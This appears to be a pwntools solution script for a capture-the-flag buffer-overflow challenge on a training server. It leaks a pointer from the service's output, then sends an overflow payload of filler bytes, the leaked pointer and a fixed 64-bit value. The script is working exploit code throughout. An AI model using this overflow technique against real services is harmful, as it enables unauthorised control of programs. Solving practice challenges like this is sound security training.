from pwn import *

r = remote("big-overflow.challs.olicyber.it", 34003)

r.recvline()
r.sendline(b"a" * 31)
r.recvuntil(b"heard ")
out_ptr = r.recvuntil(b"but").replace(b"but", b"").split(b"\n")[1].hex() + "0000"

print(out_ptr)

payload = b"a" * 32
payload += bytes.fromhex(out_ptr)
payload += p64(0x5ab1bb0)

r.recv(1000)
r.send(payload)

print(r.recv(1000).decode())